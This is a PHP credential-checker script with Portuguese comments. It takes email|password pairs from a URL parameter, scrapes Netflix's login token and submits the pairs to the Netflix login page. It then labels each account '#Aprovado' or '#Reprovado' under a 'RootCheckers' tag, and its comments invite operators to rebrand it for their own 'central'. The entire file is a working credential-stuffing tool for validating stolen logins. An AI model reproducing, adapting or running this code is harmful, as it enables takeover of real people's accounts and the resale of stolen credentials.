<?php
set_time_limit(0);
error_reporting(0);


class cURL {
    var $callback = false;
    function setCallback($func_name) {
        $this->callback = $func_name;
    }
    function doRequest($method, $url, $vars) {
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_NOBODY, 0);
        curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, arraY("Accept: application/json, text/javascript, */*; q=0.01", "Content-Type: application/x-www-form-urlencoded; charset=UTF-8", "Authorization: HermitPauzudo.txt.py.virus.hack.fimose.com"));
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_TIMEOUT, 200);
        curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
        curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
        curl_setopt($ch, CURLOPT_VERBOSE, 1);
        if ($method == 'POST') {
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $vars);
        }
        $data = curl_exec($ch);
       // echo $data;
        curl_close($ch);

        if ($data) {
            if ($this->callback) {
                $callback = $this->callback;
                $this->callback = false;
                return call_user_func($callback, $data);
            } else {
                return $data;
            }
        } else {
            return curl_error($ch);
        }
    }
    function get($url) {
        return $this->doRequest('GET', $url, 'NULL');
    }
    function post($url, $vars) {
        return $this->doRequest('POST', $url, $vars);
    }
}

function GetStr($string,$start,$end){
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}


$linha = $_GET["linha"];
$email = explode("|", $linha)[0];
$senha = explode("|", $linha)[1];



$nc = new cURL();
$getoken = $nc->get('https://www.netflix.com/br/login'); //Aqui o link da pagina de login normal
$token = GetStr($getoken,'<input type="hidden" name="accessToken" value="','"'); //Aqui inicio e final do token



 
$a = new cURL();             //aqui o request url                          aqui são as divisoes de email= senha= essas coisas
      $b = $a->post ('https://www.netflix.com/br/login', 'token='.$token.'&userLoginId='.$email.'&password='.$senha.'');
    
   $getscurl = new cURL();
        $getss = $getscurl->get('https://www.netflix.com/br/login');  //aqui é o site onde tem as coisas que voce quer puxar
if (file_exists(getcwd().'/cookie.txt')) {
            unlink(getcwd().'/cookie.txt');
        }
                $numero = GetStr($getss, 'Desculpe, não encontramos uma conta com esse endereço de email. Tente novamente ou crie um nova conta.','<'); //Aqui inicio e final do que voce quer puxar
				 $nome = GetStr($getss, '<input type="text" name="firstname" value="','"'); //Aqui inicio e final do que voce quer puxar
				
             
               
               

        if (strpos($b, 'Sair')) {  //Aqui é a mensagem de Aprovado, ce quiser fazer de reprovada invertem
 echo "Status: #Aprovado - Email: $email - Senha: $senha - Dominios: $numero - Nome: $nome [RootCheckers]"; //Voce pode trocar RootCheckers para o nome da sua central
                //A palavra #Aprovado tem que ter para pegar na INDEX
 



        }else{

       echo "#Reprovado $email|$senha  [RootCheckers] "; //Voce pode trocar RootCheckers para o nome da sua central
                    //A palavra #Reprovado tem que ter para pegar na INDEX

 


}
 


?>

    </body>
</html>